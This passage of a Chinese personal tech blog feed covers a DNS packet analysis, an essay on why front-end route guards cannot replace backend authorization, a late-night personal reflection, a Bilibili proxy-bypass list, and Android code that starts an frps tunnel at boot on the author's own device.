(0x0001)</span><br><span class="line">            Time to live: 33 (33 seconds)</span><br><span class="line">            Data length: 4</span><br><span class="line">            Address: 117.21.229.232</span><br><span class="line">    [Request In: 1]</span><br><span class="line">    [Time: 0.040862000 seconds]</span><br></pre></td></tr></table></figure>

<h3 id="5-DNS-响应（核心内容）"><a href="#5-DNS-响应（核心内容）" class="headerlink" title="5. DNS 响应（核心内容）"></a><strong>5. DNS 响应（核心内容）</strong></h3><h4 id="DNS-头部"><a href="#DNS-头部" class="headerlink" title="DNS 头部"></a><strong>DNS 头部</strong></h4><ul>
<li><p><strong>事务 ID</strong>：<code>0x6c98</code>（匹配请求与响应）。</p>
</li>
<li><p>标志字段</p>
<p>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x8180</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Response=1</code>：这是一个响应报文。</li>
<li><code>Recursion desired=1</code>：客户端请求递归查询。</li>
<li><code>Recursion available=1</code>：服务器支持递归查询。</li>
<li><code>Reply code=0000</code>：无错误（No error）。</li>
</ul>
</li>
<li><p>记录数</p>
<p>：</p>
<ul>
<li><code>Questions: 1</code>（查询 1 个域名）。</li>
<li><code>Answer RRs: 8</code>（返回 8 条 A 记录）。</li>
</ul>
</li>
</ul>
<h4 id="查询部分（Queries）"><a href="#查询部分（Queries）" class="headerlink" title="查询部分（Queries）"></a><strong>查询部分（Queries）</strong></h4><ul>
<li><p>查询域名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s1.hdslb.com.w.kunlunar.com</span><br></pre></td></tr></table></figure>

<ul>
<li>类型：<code>A</code>（IPv4 地址）。</li>
<li>类：<code>IN</code>（Internet）。</li>
</ul>
</li>
</ul>
<h4 id="应答部分（Answers）"><a href="#应答部分（Answers）" class="headerlink" title="应答部分（Answers）"></a><strong>应答部分（Answers）</strong></h4><p>返回了 8 条 A 记录，指向以下 IP 地址（TTL 均为 33 秒）：</p>
<ol>
<li><code>117.21.229.243</code></li>
<li><code>117.21.229.244</code></li>
<li><code>117.21.229.231</code></li>
<li><code>117.21.229.241</code></li>
<li><code>117.21.229.242</code></li>
<li><code>117.21.229.248</code></li>
<li><code>117.21.229.249</code></li>
<li><code>117.21.229.232</code></li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-4-24-路由守护安全性问题研究</title>
    <url>/2025/04/24/2025-4-24-%E8%B7%AF%E7%94%B1%E5%AE%88%E6%8A%A4%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h1 id="前端路由守卫的安全局限性：为什么权限验证必须依赖后端"><a href="#前端路由守卫的安全局限性：为什么权限验证必须依赖后端" class="headerlink" title="前端路由守卫的安全局限性：为什么权限验证必须依赖后端"></a>前端路由守卫的安全局限性：为什么权限验证必须依赖后端</h1><h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><p>我在使用<code>Vue.js</code> 框架开发应用时涉及到了鉴权部分，之前用的框架大都是全栈框架，以此为由，我注意到此框架自带名为<strong>路由守卫</strong> 的拦截机制，并对其原理部分和实际应用进行了深入研究。</p>
<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>在现代Web开发架构中，前端路由守卫常被用于管理页面访问权限。这种机制虽然能提供良好的用户体验，但从安全角度来看存在根本性缺陷。本文将深入分析前端权限控制的不可靠性，并探讨如何构建真正安全的权限验证体系。</p>
<ol>
<li>前端路由守卫的运作机制与安全边界
前端路由守卫通过在导航发生前执行权限检查来控制页面访问。这种机制本质上是在客户端环境中运行的，而客户端环境具有以下特点：</li>
</ol>
<p>执行环境不可控：浏览器环境完全暴露给终端用户
数据存储易被干预：客户端存储机制没有真正的保护
逻辑可被修改：运行时的JavaScript可以被观察和干预
这些特性决定了前端权限控制只能作为用户体验优化手段，而不能作为安全防线。</p>
<ol start="2">
<li>前端权限控制的本质缺陷
2.1 客户端环境的不可信性
所有在前端执行的权限检查都存在被绕过的可能性。用户可以通过多种方式干预权限验证过程，包括但不限于：</li>
</ol>
<p>直接修改内存中的权限状态
拦截并修改网络请求
使用开发者工具干预程序执行流程</p>
<h3 id="2-2-安全边界划分错误"><a href="#2-2-安全边界划分错误" class="headerlink" title="2.2 安全边界划分错误"></a>2.2 安全边界划分错误</h3><p>安全设计的基本原则是将信任边界尽可能后移。将权限验证放在前端，相当于将安全防线部署在最容易被攻破的位置。</p>
<h3 id="2-3-权限与数据的分离"><a href="#2-3-权限与数据的分离" class="headerlink" title="2.3 权限与数据的分离"></a>2.3 权限与数据的分离</h3><p>即使前端成功拦截了页面访问，如果后端没有进行相应的权限验证，攻击者仍可能通过直接调用API获取敏感数据。</p>
<ol start="3">
<li>构建可靠的权限验证体系
3.1 后端主导的权限验证
真正的安全防线必须建立在服务端。后端权限验证应该：</li>
</ol>
<p>对每个请求进行完整的身份认证
实施严格的访问控制检查
遵循最小权限原则</p>
<h3 id="3-2-前后端协作的安全模式"><a href="#3-2-前后端协作的安全模式" class="headerlink" title="3.2 前后端协作的安全模式"></a>3.2 前后端协作的安全模式</h3><p>在这种模式下：</p>
<p>前端负责提供流畅的用户体验
后端负责执行实际的权限验证
所有敏感操作都必须经过后端验证</p>
<h3 id="3-3-纵深防御策略"><a href="#3-3-纵深防御策略" class="headerlink" title="3.3 纵深防御策略"></a>3.3 纵深防御策略</h3><p>完善的权限系统应该实现多层防护：</p>
<p>网络层的访问控制
API网关的权限检查
业务逻辑层的权限验证
数据访问层的权限过滤</p>
<ol start="4">
<li>安全设计的最佳实践
4.1 默认拒绝原则
系统应该默认拒绝所有请求，只有显式允许的请求才能通过。</li>
</ol>
<h3 id="4-2-持续验证机制"><a href="#4-2-持续验证机制" class="headerlink" title="4.2 持续验证机制"></a>4.2 持续验证机制</h3><p>不要依赖单次验证，要在关键操作链路的每个环节都进行权限确认。</p>
<h3 id="4-3-完善的监控与审计"><a href="#4-3-完善的监控与审计" class="headerlink" title="4.3 完善的监控与审计"></a>4.3 完善的监控与审计</h3><p>建立完整的操作日志系统，记录所有敏感操作，便于安全审计和异常检测。</p>
<p>结论
前端路由守卫在提升用户体验方面具有价值，但绝不能作为安全依赖。开发者必须清醒认识到：</p>
<p>任何客户端执行的权限检查都存在被绕过的可能
真正的安全防线必须建立在服务端
完善的权限系统需要实施纵深防御策略
在安全设计上，我们必须遵循”信任但要验证”的原则，将每个请求都视为潜在的恶意请求来处理。只有建立在这种认知基础上的权限系统，才能真正保护应用和数据的安全。</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>Vue.js</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-5-15-深夜随笔</title>
    <url>/2025/05/15/2025-5-15-%E6%B7%B1%E5%A4%9C%E9%9A%8F%E7%AC%94/</url>
    <content><![CDATA[<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><p>不想记录糟心事了</p>
<p>又睡不着觉</p>
<p>一旦过了最容易睡着的时间，就睡不着</p>
<p>我一直渴望和奢求着有人能帮助我</p>
<p>提醒我睡觉也好</p>
<p>关心一下我的精神也好</p>
<p>现在才意识到，这些不过是梦的泡影</p>
<p>人之间，永远无法做到共情</p>
<p>即使表达，也不可能互相理解</p>
<p>人无法脱离社会，却又无法彻底的融入社会</p>
<p>组成社会的人群又是一个个单独的个体</p>
<p>彼此之间的建立的关系是唯心的，基于幻想的</p>
<p>逐利，为何要逐利，我挣得的，劳动换取的，也不过是满足了我的生存需求罢了</p>
<p>一次又一次下定的决心，自身认为该做的事，动摇的决心，无法克制的欲望，基于情绪犯下的错，一遍又一遍的伤害着自己</p>
<p>我不断的伤害自己，又不断的争夺资源，试图修补自己，我到底是什么</p>
<p>生活像自虐一般的度过</p>
<p>香烟使我保持短暂的清醒，劣质的尼古丁有时使我作呕</p>
<p>我清楚的知道，人本质还是动物，从未脱离这一概念，正因如此，在有限的资源条件下，不存在合作和共赢，只存在弱肉强食，以及食物链般的共存</p>
<p>也许也不是我太不清醒，只是求生的激素促使着我，寻找着救赎自我的方法</p>
<p>但很显然，我的神经元和激素并不知道，世上不存在救赎，什么都好，也不过是缓释剂</p>
<p>长叹~~~</p>
<p>— 记录于 出租屋 </p>
]]></content>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-7-4-解决路由模式BUG</title>
    <url>/2025/07/04/2025-7-4-%E8%A7%A3%E5%86%B3%E8%B7%AF%E7%94%B1%E6%A8%A1%E5%BC%8FBUG/</url>
    <content><![CDATA[<h3 id="in-use-BUG-fix"><a href="#in-use-BUG-fix" class="headerlink" title="in use BUG fix"></a>in use BUG fix</h3><ol>
<li><code>编辑选项 -&gt; 设置 -&gt; 系统代理 -&gt; 绕过域/网络</code></li>
</ol>
<p>添加以下内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&lt;local&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;*.bilibili.com&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;bilibili.com&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;local&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;*.b23.tv&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;b23.tv&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&lt;local&gt;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;bilivideo.com&quot;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&quot;*.bilivideo.com</span></span><br></pre></td></tr></table></figure>

<p>思路：抓包查看b站api连接情况，理应b站全部内容走国内流量，但一些域名可能被解析为国外内容</p>
]]></content>
      <tags>
        <tag>proxy</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-7-12-尝试开发远古安卓软件</title>
    <url>/2025/07/12/2025-7-12-%E5%B0%9D%E8%AF%95%E5%BC%80%E5%8F%91%E8%BF%9C%E5%8F%A4%E5%AE%89%E5%8D%93%E8%BD%AF%E4%BB%B6/</url>
    <content><![CDATA[<h3 id="因为有需求-所以有了这次尝试"><a href="#因为有需求-所以有了这次尝试" class="headerlink" title="因为有需求 所以有了这次尝试"></a>因为有需求 所以有了这次尝试</h3><p>由于种种原因（手机丢失… 卧室搬迁）</p>
<p>我的 Ubuntu服务器移动了位置 ，而位于原址的网络处于停用状态。</p>
<p>恢复使用的一大方案就是放置一台终端连接那边的网络，然后设置为DMZ主机。</p>
<p>但是很显然，我现在不具备这个条件。</p>
<p>所幸 2020年认识的 HLL(货拉拉)同学赠送了我一台 海信芯片(<code>Hi3798MV310</code>)的 <code>UNT402H</code></p>
<p>此前尝试过获取<code>ROOT</code> 权限，刷入 Linux 或者启用一些终端之类的操作，均失败</p>
<p>今天我想到了绝佳方案</p>
<p>编译为 <code>arm</code>平台 的现成的 <code>frps</code> 完全有条件可以部署在这台设备上，然后我其他没有公网端口使用的设备向这里穿透就可以使用了。</p>
<p>需要考虑的问题</p>
<ul>
<li>停电的可能 </li>
<li>动态公网IP会重置</li>
<li>无法直接操作此终端</li>
</ul>
<p>解决方案</p>
<ul>
<li><p>开机自启动</p>
</li>
<li><p>向固定域名发送<code>ip</code>地址，防止失联</p>
</li>
</ul>
<p>大概折腾了五个小时</p>
<p>先尝试 <code>adb</code> 连接，测试了<code>frps</code> 确实可行</p>
<p>然后搞这个环境用了许久，<code>Android Studio</code> 我并不熟悉，算是踩了一点坑。</p>
<p>这些折腾完大概花了三小时</p>
<p>实际开发代码</p>
<h3 id="MainActivity-kt"><a href="#MainActivity-kt" class="headerlink" title="MainActivity.kt"></a>MainActivity.kt</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.curesky.netserver</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity</span><br><span class="line"><span class="keyword">import</span> java.io.File</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream</span><br><span class="line"><span class="keyword">import</span> java.io.IOException</span><br><span class="line"><span class="keyword">import</span> com.curesky.netserver.databinding.ActivityMainBinding</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MainActivity</span> : <span class="type">AppCompatActivity</span>() &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">lateinit</span> <span class="keyword">var</span> binding: ActivityMainBinding</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> frpsBinName = <span class="string">&quot;frps&quot;</span>      <span class="comment">// 可执行文件名</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> frpsConfigName = <span class="string">&quot;frps.ini&quot;</span> <span class="comment">// 配置文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">onCreate</span><span class="params">(savedInstanceState: <span class="type">Bundle</span>?)</span></span> &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState)</span><br><span class="line">        binding = ActivityMainBinding.inflate(layoutInflater)</span><br><span class="line">        setContentView(binding.root)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化FRPS文件</span></span><br><span class="line">        initFrpsFiles()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 直接执行 FRPS（不再依赖按钮点击）</span></span><br><span class="line">        runFrps()</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可选：列出文件（调试用）</span></span><br><span class="line">        listPrivateFiles()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 将assets中的frps文件复制到私有目录</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">initFrpsFiles</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 创建bin目录（/data/data/包名/files/bin）</span></span><br><span class="line">            <span class="keyword">val</span> binDir = File(filesDir, <span class="string">&quot;bin&quot;</span>).apply &#123;</span><br><span class="line">                <span class="keyword">if</span> (!exists()) mkdirs()</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 2. 复制可执行文件</span></span><br><span class="line">            copyAssetToFile(frpsBinName, File(binDir, frpsBinName).apply &#123;</span><br><span class="line">                <span class="comment">// 添加执行权限（仅Linux有效）</span></span><br><span class="line">                setExecutable(<span class="literal">true</span>)</span><br><span class="line">            &#125;)</span><br><span class="line">            <span class="comment">// 3. 复制配置文件</span></span><br><span class="line">            copyAssetToFile(frpsConfigName, File(filesDir, frpsConfigName))</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">            binding.textView.text = <span class="string">&quot;初始化FRPS失败: <span class="subst">$&#123;e.message&#125;</span>&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 从assets复制文件到目标位置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">copyAssetToFile</span><span class="params">(assetName: <span class="type">String</span>, targetFile: <span class="type">File</span>)</span></span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            assets.<span class="keyword">open</span>(assetName).use &#123; input -&gt;</span><br><span class="line">                FileOutputStream(targetFile).use &#123; output -&gt;</span><br><span class="line">                    input.copyTo(output)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: IOException) &#123;</span><br><span class="line">            <span class="keyword">throw</span> IOException(<span class="string">&quot;复制 <span class="variable">$assetName</span> 失败&quot;</span>, e)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 执行frps（需要处理权限问题）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">runFrps</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">val</span> frpsPath = File(filesDir, <span class="string">&quot;bin/<span class="variable">$frpsBinName</span>&quot;</span>).absolutePath</span><br><span class="line">        <span class="keyword">val</span> configPath = File(filesDir, frpsConfigName).absolutePath</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 执行命令</span></span><br><span class="line"><span class="comment">//            binding.textView.append(&quot;\n\n🚀 [FRPS 服务]&quot;)</span></span><br><span class="line"></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;<span class="variable">$frpsPath</span> -c <span class="variable">$configPath</span>&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (e: Exception) &#123;</span><br><span class="line">            binding.textView.append(<span class="string">&quot;\n\n❌ FRPS启动失败: <span class="subst">$&#123;e.message&#125;</span>&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 列出私有目录文件（调试用）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">listPrivateFiles</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">val</span> sb = StringBuilder(<span class="string">&quot;📁 私有目录文件列表:\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 列出所有目录</span></span><br><span class="line">        listFilesInDirectory(filesDir, sb)</span><br><span class="line">        <span class="comment">// 显示结果</span></span><br><span class="line">        binding.textView.text = sb.toString()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">fun</span> <span class="title">listFilesInDirectory</span><span class="params">(dir: <span class="type">File</span>, sb: <span class="type">StringBuilder</span>, indent: <span class="type">String</span> = <span class="string">&quot;&quot;</span>)</span></span> &#123;</span><br><span class="line">        dir.listFiles()?.forEach &#123; file -&gt;</span><br><span class="line">            <span class="keyword">val</span> prefix = <span class="keyword">if</span> (file.isDirectory) <span class="string">&quot;📂 &quot;</span> <span class="keyword">else</span> <span class="string">&quot;📄 &quot;</span></span><br><span class="line">            sb.append(<span class="string">&quot;<span class="variable">$indent</span><span class="variable">$prefix</span><span class="subst">$&#123;file.name&#125;</span>\n&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> (file.isDirectory) &#123;</span><br><span class="line">                listFilesInDirectory(file, sb, <span class="string">&quot;<span class="variable">$indent</span>    &quot;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="BootReceiver-java"><a href="#BootReceiver-java" class="headerlink" title="BootReceiver.java"></a>BootReceiver.java</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.curesky.netserver; <span class="comment">// 确保包名与 manifest 一致</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BootReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) &#123;</span><br><span class="line">            <span class="comment">// 开机后启动 MainActivity</span></span><br><span class="line">            <span class="type">Intent</span> <span class="variable">launchIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(context, MainActivity.class);</span><br><span class="line">            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK); <span class="comment">// 必须加！</span></span><br><span class="line">            context.startActivity(launchIntent);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.curesky.netserver&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 权限 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.SYSTEM_ALERT_WINDOW&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_SETTINGS&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.NetServer&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- MainActivity（入口） --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- 广播接收器：监听开机启动 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.BootReceiver&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 可选：监听用户解锁设备（某些设备需要） --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.USER_PRESENT&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上三个内容基本是我开发的重点所在</p>
<p>两个核心逻辑实现，和一个权限实现</p>
<p>想总结些什么，但是身体还没调理好，所以仅能记录这些了。</p>
]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kotlin</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-7-12-Android开发笔记</title>
    <url>/2025/07/12/2025-7-12-Android%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="开发笔记"><a href="#开发笔记" class="headerlink" title="开发笔记"></a>开发笔记</h3><h2 id="🛠️-开发环境配置"><a href="#🛠️-开发环境配置" class="headerlink" title="🛠️ 开发环境配置"></a>🛠️ 开发环境配置</h2><h3 id="基础工具链"><a href="#基础工具链" class="headerlink" title="基础工具链"></a>基础工具链</h3><p>| 组件           | 版本要求       | 备注                          |
| ————– | ————– | —————————– |
| Android Studio | Flamingo 2022+ | 需支持 AGP 8.0                |
| JDK            | 17+            | 推荐使用 Temurin 发行版       |
| Gradle         | 8.0+           | 使用 Wrapper 确保版本一致     |
| Android SDK    | API 19+        | 最低兼容 Android 4.4 (KitKat) |</p>
<h3 id="关键依赖说明"><a href="#关键依赖说明" class="headerlink" title="关键依赖说明"></a>关键依赖说明</h3><figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">dependencies &#123;    </span><br><span class="line">    <span class="comment">// 基础框架    </span></span><br><span class="line">    implementation(libs.androidx.core.ktx)       </span><br><span class="line">    <span class="comment">// 提供 Kotlin 扩展 API    </span></span><br><span class="line">    implementation(libs.androidx.appcompat)     </span><br><span class="line">    <span class="comment">// 兼容性支持库    </span></span><br><span class="line">    implementation(libs.material)                </span><br><span class="line">    <span class="comment">// Material Design 组件    </span></span><br><span class="line">    <span class="comment">// 测试框架    </span></span><br><span class="line">    testImplementation(libs.junit)               <span class="comment">// 单元测试</span></span><br><span class="line">    androidTestImplementation(libs.androidx.junit)     <span class="comment">// 仪器化测试</span></span><br><span class="line">    androidTestImplementation(libs.androidx.espresso.core)  <span class="comment">// UI 自动化测试</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="基本的项目文件结构概况"><a href="#基本的项目文件结构概况" class="headerlink" title="基本的项目文件结构概况"></a><strong>基本的项目文件结构概况</strong></h3><p>一个标准的 Android 项目通常遵循以下目录结构（基于 <strong>Android Studio</strong> 默认模板）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MyApp/</span><br><span class="line">├── app/                       <span class="comment"># 主模块（Module）</span></span><br><span class="line">│   ├── build.gradle           <span class="comment"># 模块级 Gradle 配置</span></span><br><span class="line">│   ├── src/</span><br><span class="line">│   │   ├── main/              <span class="comment"># 主代码和资源</span></span><br><span class="line">│   │   │   ├── AndroidManifest.xml  <span class="comment"># 应用配置入口</span></span><br><span class="line">│   │   │   ├── java/          <span class="comment"># Java/Kotlin 代码（包结构）</span></span><br><span class="line">│   │   │   ├── res/           <span class="comment"># 资源文件（布局、图片、字符串等）</span></span><br><span class="line">│   │   │   │   ├── drawable/  <span class="comment"># 图片和矢量图</span></span><br><span class="line">│   │   │   │   ├── layout/    <span class="comment"># XML 布局文件</span></span><br><span class="line">│   │   │   │   ├── values/    <span class="comment"># 字符串、颜色、样式等</span></span><br><span class="line">│   │   │   │   └── ...        </span><br><span class="line">│   │   │   └── assets/        <span class="comment"># 原始资源文件（如 JSON、字体）</span></span><br><span class="line">│   │   └── <span class="built_in">test</span>/              <span class="comment"># 单元测试代码</span></span><br><span class="line">│   └── ...</span><br><span class="line">├── gradle/                    <span class="comment"># Gradle 包装器配置</span></span><br><span class="line">├── build.gradle               <span class="comment"># 项目级 Gradle 配置</span></span><br><span class="line">└── settings.gradle            <span class="comment"># 模块管理（如引入子模块）</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-私有目录和公有目录"><a href="#1-私有目录和公有目录" class="headerlink" title="1. 私有目录和公有目录"></a><strong>1. 私有目录和公有目录</strong></h3><ul>
<li>技术点：<ul>
<li><strong>私有目录</strong>：<code>/data/data/&lt;package-name&gt;/</code>（内部存储），使用 <code>Context.getFilesDir()</code> 或 <code>getCacheDir()</code> 访问，无需权限，应用卸载时自动清除。</li>
